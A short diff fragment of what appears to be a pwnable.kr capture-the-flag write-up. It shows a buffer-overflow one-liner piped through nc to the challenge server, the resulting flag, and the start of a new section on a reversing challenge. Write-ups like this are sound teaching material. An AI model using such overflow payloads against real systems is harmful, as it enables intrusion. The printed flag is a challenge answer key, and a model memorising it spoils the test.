@@ -104,7 +104,9 @@ We now run `(python -c "print 'A'*52+'\xbe\xba\xfe\xca'"; cat) | nc pwnable.kr 9
 
 flag: `daddy, I just pwned a buFFer :)`
 
+# flag
 
+This is a reversing question, so we're not given a c file, just the binary. If we try to load the binary in IDA, we see that many of the functions were unable to decompiled, and in GDB we can't seem to find the `main` function.
 
 
 
